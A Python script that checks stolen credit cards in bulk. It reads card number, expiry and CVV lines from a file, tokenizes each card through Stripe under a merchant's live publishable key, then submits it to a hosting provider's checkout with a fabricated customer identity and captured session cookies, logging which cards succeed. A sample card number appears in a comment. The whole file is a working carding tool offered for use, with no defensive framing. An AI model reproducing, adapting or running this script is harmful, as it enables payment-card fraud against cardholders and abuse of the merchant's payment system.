import subprocess
import json

file_path = "data.txt"
def stripe(cc,mes,ano,cvv):
    command = f"""curl 'https://api.stripe.com/v1/payment_methods' \
  -H 'authority: api.stripe.com' \
  -H 'accept: application/json' \
  -H 'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7' \
  -H 'content-type: application/x-www-form-urlencoded' \
  -H 'origin: https://js.stripe.com' \
  -H 'referer: https://js.stripe.com/' \
  -H 'sec-ch-ua: "Not:A-Brand";v="99", "Chromium";v="112"' \
  -H 'sec-ch-ua-mobile: ?1' \
  -H 'sec-ch-ua-platform: "Android"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; M2006C3MII) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36' \
  --data-raw 'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=fecf7c2a-680e-4b66-b419-af501a5146b00cd775&muid=588c94d4-d164-4e91-9593-569e34319c78788d24&sid=9928d741-6766-4f72-97f2-5066a61ad7db696473&pasted_fields=number&payment_user_agent=stripe.js%2Fc68765f93f%3B+stripe-js-v3%2Fc68765f93f%3B+split-card-element&time_on_page=51115&key=pk_live_51JnfD0IxzC5X2alIWgLJijldZHrTGkDLdazqECEDpbaTKx2jYYHri6rIZofygpBxAHIrhTLzjM57Ir4QvnByLgM400hbx4Pige' \
  --compressed"""
    process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
    output, _ = process.communicate()
    command_output = output.decode()
    json_output = json.loads(command_output)
    if json_output['id']:
        paymetid =json_output['id']
        print(paymetid)
        return paymetid

# stripe(5357386252340543,'09',2026,523)

def check(id):
    command = f"""curl 'https://manage.digirdp.com/index.php?rp=/stripe/payment/intent' \
  -H 'authority: manage.digirdp.com' \
  -H 'accept: application/json, text/javascript, */*; q=0.01' \
  -H 'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7' \
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'cookie: WHMCSy551iLvnhYt7=93e6ea25d717b3fb70c965133b415015; _ga=GA1.3.62849786.1689482132; G_ENABLED_IDPS=google; twk_idm_key=DCXNr5dnuX417Esxvmond; __stripe_mid=588c94d4-d164-4e91-9593-569e34319c78788d24; __stripe_sid=9928d741-6766-4f72-97f2-5066a61ad7db696473; TawkConnectionTime=0; twk_uuid_5d4c52d37d27204601c9ff11=%7B%22uuid%22%3A%221.70gU3nIkx5rv0r0j9liPUdsbx7wkFncq9NzequU2upUskRDn16dF0PvVqmxNEPlr8zKvUYYKrzlxc7qlr3XbqWdcLMUIsxmoFPv77FplRDv12xY52ld5%22%2C%22version%22%3A3%2C%22domain%22%3A%22digirdp.com%22%2C%22ts%22%3A1689482178004%7D; _ga_4MJCEZQFN5=GS1.3.1689482131.1.1.1689482193.0.0.0' \
  -H 'origin: https://manage.digirdp.com' \
  -H 'referer: https://manage.digirdp.com/cart.php?a=checkout' \
  -H 'sec-ch-ua: "Not:A-Brand";v="99", "Chromium";v="112"' \
  -H 'sec-ch-ua-mobile: ?1' \
  -H 'sec-ch-ua-platform: "Android"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; M2006C3MII) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36' \
  -H 'x-requested-with: XMLHttpRequest' \
  --data-raw 'token=102490c5e02c31238cbe640d933cd760a24bb68c&submit=true&loginemail=&loginpassword=&custtype=new&firstname=Jimmy&lastname=Joy&email=jimmmyjoy56723%40outlook.com&country-calling-code-phonenumber=1&phonenumber=727-882-8828&companyname=&address1=276+Street&address2=&city=New+York&state=New+York&postcode=10080&country=US&password=QR02%40z%2CJe%7Dr~&password2=QR02%40z%2CJe%7Dr~&applycredit=1&paymentmethod=stripe&ccinfo=new&ccdescription=&marketingoptin=1&notes=&accepttos=on&payment_method_id={id}' \
  --compressed"""
    process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
    output, _ = process.communicate()
    command_output = output.decode()
    json_output = json.loads(command_output)
    
    print(json_output)
    return json_output



# Open the text file
with open('cc.txt', 'r') as file:
    # Read each line in the file
    for line in file:
        # Remove leading/trailing whitespaces and split the line by '|'
        values = line.strip().split('|')
        
        # Store the values in separate variables
        value1 = values[0]
        value2 = values[1]
        value3 = values[2]
        value4 = values[3]
        idd = stripe(value1, value2, value3, value4)
        da = check(idd)
        with open("output.txt", 'a') as output_file:
            output_file.write(str(line) + str(da) + '\n')

